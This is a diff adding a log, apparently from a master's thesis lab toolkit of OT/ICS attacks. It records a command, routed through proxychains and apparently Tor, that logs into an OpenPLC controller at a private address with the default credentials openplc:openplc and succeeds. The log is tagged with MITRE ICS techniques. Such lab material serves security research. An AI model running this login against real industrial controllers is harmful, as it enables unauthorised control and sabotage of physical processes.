@@ -1,0 +1,17 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Login con credenciales por defecto
+======================================================================
+  Fecha      : 2026-10-12 12:46:50
+  Objetivo   : 192.168.10.10:8080 (openplc:openplc)
+  MITRE ICS  : T0812, T0884
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli default_login --target 192.168.10.10 --port 8080 --user openplc --password openplc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Acceso concedido: las credenciales por defecto siguen activas.
+[=] Código de salida: 0
